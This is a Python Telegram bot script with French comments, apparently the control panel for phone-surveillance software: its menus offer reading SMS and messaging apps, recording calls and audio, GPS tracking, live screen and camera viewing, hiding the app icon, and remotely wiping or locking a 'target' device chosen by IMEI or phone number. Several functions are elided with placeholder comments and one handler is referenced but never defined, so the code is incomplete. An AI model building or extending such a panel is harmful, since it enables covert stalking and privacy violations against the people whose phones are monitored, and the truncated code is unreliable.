# main.py (version avec menu permanent)
import os
import logging
from datetime import datetime
from telegram import Update, ReplyKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    ContextTypes,
    ConversationHandler,
    filters
)
import database
import file_manager
import report_generator
from config import BOT_TOKEN, ADMIN_IDS, DATA_PATH, DB_NAME

# Initialisation de la base de données
database.init_db(DB_NAME)

# Configuration des états de conversation
MAIN_MENU, CATEGORY_SELECTION, SUBCATEGORY_SELECTION, FILE_OPERATION = range(4)

# Configurez le logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Structure complète du menu
MENU_STRUCTURE = {
    "📱 SMS/MMS": {
        "folder": "sms_mms",
        "submenu": [
            "Suivi des SMS et MMS",
            "Alerte SMS"
        ]
    },
    "📞 Appels": {
        "folder": "appels",
        "submenu": [
            "Suivi des journaux d'appels",
            "Enregistrement des appels",
            "Blocage des appels"
        ]
    },
    "📍 Localisation": {
        "folder": "localisations",
        "submenu": [
            "Historique des positions GPS",
            "Suivi en temps réel"
        ]
    },
    "🖼️ Photos & Vidéos": {
        "folder": "photos",
        "submenu": [
            "Visualiser les photos et images"
        ]
    },
    "💬 Messagerie instantanée": {
        "folder": "messageries",
        "submenu": [
            "WhatsApp", "Facebook Messenger", "Skype", "Hangouts", "LINE",
            "Kik", "Viber", "Gmail", "Tango", "Snapchat", "Telegram"
        ]
    },
    "🎙️ Contrôle à distance": {
        "folder": "controle_distance",
        "submenu": [
            "Enregistrement audio",
            "Prendre une photo",
            "Commande SMS",
            "Faire vibrer/sonner",
            "Envoyer message vocal",
            "Envoyer popup texte",
            "Envoyer SMS externe",
            "Position GPS",
            "Capture d'écran",
            "Récupérer données",
            "Info téléphone",
            "Cacher/Voir icône",
            "Activer/Désactiver Wi-Fi",
            "Redémarrer téléphone",
            "Formater téléphone",
            "Bloquer téléphone"
        ]
    },
    "📺 Visualisation en direct": {
        "folder": "visualisation_directe",
        "submenu": [
            "Audio/Vidéo/Screen"
        ]
    },
    "📁 Gestionnaire de fichiers": {
        "folder": "fichiers",
        "submenu": [
            "Explorateur de fichiers"
        ]
    },
    "⏱ Restriction d'horaire": {
        "folder": "restrictions",
        "submenu": [
            "Restreindre utilisation"
        ]
    },
    "📱 Applications": {
        "folder": "applications",
        "submenu": [
            "Suivi applications installées",
            "Blocage des applications"
        ]
    },
    "🌐 Sites Web": {
        "folder": "sites_web",
        "submenu": [
            "Historique des sites",
            "Blocage des sites"
        ]
    },
    "📅 Calendrier": {
        "folder": "calendrier",
        "submenu": [
            "Historique des événements"
        ]
    },
    "👤 Contacts": {
        "folder": "contacts",
        "submenu": [
            "Suivi des nouveaux contacts"
        ]
    },
    "📊 Outils d'analyse": {
        "folder": "analyse",
        "submenu": [
            "Statistiques",
            "Rapport PDF/Excel/CSV"
        ]
    }
}

def get_persistent_keyboard():
    """Clavier permanent visible dans tous les états"""
    return [
        ["📱 SMS/MMS", "📞 Appels", "📍 Localisation"],
        ["🖼️ Photos & Vidéos", "💬 Messagerie", "🎙️ Contrôle"],
        ["📁 Fichiers", "📋 Admin", "🔄 Actualiser"]
    ]

def get_main_category_keyboard():
    """Clavier principal avec catégories"""
    return [
        ["📱 SMS/MMS", "📞 Appels", "📍 Localisation"],
        ["🖼️ Photos & Vidéos", "💬 Messagerie instantanée", "🎙️ Contrôle à distance"],
        ["📺 Visualisation en direct", "📁 Gestionnaire de fichiers", "⏱ Restriction d'horaire"],
        ["📱 Applications", "🌐 Sites Web", "📅 Calendrier"],
        ["👤 Contacts", "📊 Outils d'analyse", "🔍 Changer d'appareil"]
    ]

def get_admin_keyboard():
    return [
        ["📋 Liste des cibles", "🗑️ Supprimer une cible"],
        ["📈 Statistiques", "📤 Exporter les logs"],
        ["⬅️ Retour au menu principal"]
    ]

async def return_to_categories(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Retour au menu des catégories avec clavier permanent"""
    device_id = context.user_data.get('current_device', 'Nouvel appareil')
    keyboard = get_persistent_keyboard()
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    
    await update.message.reply_text(
        f"Retour au menu principal pour {device_id}:",
        reply_markup=reply_markup
    )
    return CATEGORY_SELECTION

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Démarre ou réinitialise la conversation"""
    context.user_data.clear()
    keyboard = get_persistent_keyboard()
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    
    await update.message.reply_text(
        "🔍 Entrez un IMEI, numéro de série ou numéro de téléphone...",
        reply_markup=reply_markup
    )
    return MAIN_MENU

async def handle_device_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère la saisie de l'identifiant de l'appareil"""
    try:
        user_input = update.message.text.strip()
        keyboard = get_persistent_keyboard()
        reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
        
        if file_manager.validate_device_id(user_input):
            file_manager.create_device_folder(user_input)
            context.user_data['current_device'] = user_input
            
            await update.message.reply_text(
                f"✅ Dossier créé pour : {user_input}\nSélectionnez une catégorie :",
                reply_markup=reply_markup
            )
            return CATEGORY_SELECTION
        else:
            await update.message.reply_text(
                "❌ Format invalide. Veuillez réessayer.",
                reply_markup=reply_markup
            )
            return MAIN_MENU
    except Exception as e:
        logger.error(f"Erreur dans handle_device_id: {str(e)}")
        return await start(update, context)

async def handle_category_selection(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère la sélection de catégorie principale"""
    try:
        category = update.message.text
        device_id = context.user_data.get('current_device')
        keyboard = get_persistent_keyboard()
        reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
        
        if not device_id:
            await update.message.reply_text(
                "❌ Session expirée. Veuillez recommencer.",
                reply_markup=reply_markup
            )
            return MAIN_MENU
        
        # Gestion des commandes admin
        if category == "📋 Admin":
            return await admin_command(update, context)
        elif category == "🔄 Actualiser":
            await update.message.reply_text(
                "🔄 Interface actualisée",
                reply_markup=reply_markup
            )
            return CATEGORY_SELECTION
        elif category == "🔍 Changer d'appareil":
            return await start(update, context)
        
        # ... [le reste de la fonction inchangé] ...
        # (Le code complet est conservé mais tronqué ici pour la lisibilité)

# ... [Les autres fonctions (handle_subcategory_selection, etc.) conservent leur logique] ...
# avec ajout systématique du clavier permanent dans les réponses

async def handle_file_operation(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère les opérations sur les fichiers avec menu permanent"""
    try:
        user_choice = update.message.text
        device_id = context.user_data.get('current_device')
        category_path = context.user_data.get('current_category')
        keyboard = get_persistent_keyboard()
        reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
        
        if not device_id or not category_path:
            await update.message.reply_text(
                "❌ Session expirée. Veuillez recommencer.",
                reply_markup=reply_markup
            )
            return MAIN_MENU
            
        if user_choice == "⬅️ Retour aux catégories":
            return await return_to_categories(update, context)
        
        elif user_choice == "⬆️ Télécharger un fichier":
            # Ajouter l'option de fichier au clavier permanent
            file_keyboard = keyboard + [["⬆️ Télécharger un fichier"]]
            file_reply_markup = ReplyKeyboardMarkup(file_keyboard, resize_keyboard=True)
            
            await update.message.reply_text(
                "⬆️ Envoyez le fichier. Le menu reste disponible :",
                reply_markup=file_reply_markup
            )
            return FILE_OPERATION
        
        else:
            # ... [traitement des fichiers existant] ...
            # Après chaque opération, réafficher le menu permanent
            await update.message.reply_text(
                "Sélectionnez une autre action:",
                reply_markup=reply_markup
            )
            return FILE_OPERATION
    
    except Exception as e:
        logger.error(f"Erreur dans handle_file_operation: {str(e)}")
        return await return_to_categories(update, context)

async def handle_file_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère le téléchargement de fichiers avec menu permanent"""
    try:
        device_id = context.user_data.get('current_device')
        category_path = context.user_data.get('current_category')
        keyboard = get_persistent_keyboard()
        reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
        
        if not device_id or not category_path:
            await update.message.reply_text(
                "❌ Session expirée. Veuillez recommencer.",
                reply_markup=reply_markup
            )
            return MAIN_MENU
            
        if update.message.document:
            file = await context.bot.get_file(update.message.document.file_id)
            file_name = update.message.document.file_name
            file_path = os.path.join(category_path, file_name)
            await file.download_to_drive(file_path)
            
            file_manager.log_activity(DB_NAME, device_id, "UPLOAD", file_path)
            
            await update.message.reply_text(
                f"✅ Fichier {file_name} téléchargé avec succès!",
                reply_markup=reply_markup
            )
            return await return_to_categories(update, context)
        
        await update.message.reply_text(
            "❌ Format de fichier non reconnu.",
            reply_markup=reply_markup
        )
        return FILE_OPERATION
    
    except Exception as e:
        logger.error(f"Erreur dans handle_file_upload: {str(e)}")
        return await return_to_categories(update, context)

# ... [Les fonctions admin_command, list_targets, etc. conservent leur logique] ...
# avec ajout systématique du clavier permanent dans les réponses

def run_bot():
    """Démarre le bot avec menu permanent"""
    application = ApplicationBuilder().token(BOT_TOKEN).build()
    
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('start', start)],
        states={
            MAIN_MENU: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_device_id)
            ],
            CATEGORY_SELECTION: [
                MessageHandler(filters.Regex(r'^(📋 Admin|🔄 Actualiser|🔍 Changer d\'appareil)$'), handle_category_selection),
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_category_selection)
            ],
            SUBCATEGORY_SELECTION: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_subcategory_selection)
            ],
            FILE_OPERATION: [
                MessageHandler(filters.Document.ALL, handle_file_upload),
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_file_operation)
            ]
        },
        fallbacks=[CommandHandler('start', start)]
    )
    
    # ... [le reste de l'initialisation inchangé] ...

if __name__ == '__main__':
    run_bot()
